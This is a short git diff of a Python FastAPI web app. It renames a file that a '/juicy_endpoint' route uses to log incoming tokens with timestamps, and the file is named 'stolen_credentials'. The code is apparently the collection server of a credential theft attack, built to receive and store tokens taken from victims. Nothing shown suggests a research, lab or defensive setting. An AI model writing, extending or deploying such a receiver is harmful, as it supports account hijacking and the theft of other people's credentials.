@@ -23,7 +23,7 @@ app.add_middleware(
 
 @app.post("/juicy_endpoint")
 def juicy_endpoint(token: str):
-    with open("stolen_credentials", "a") as file:
+    with open("stolen_credentials.txt", "a") as file:
         file.write(datetime.datetime.now().strftime("%d-%m-%Y, %H:%M"))
         file.write("\n")
         file.write(token)
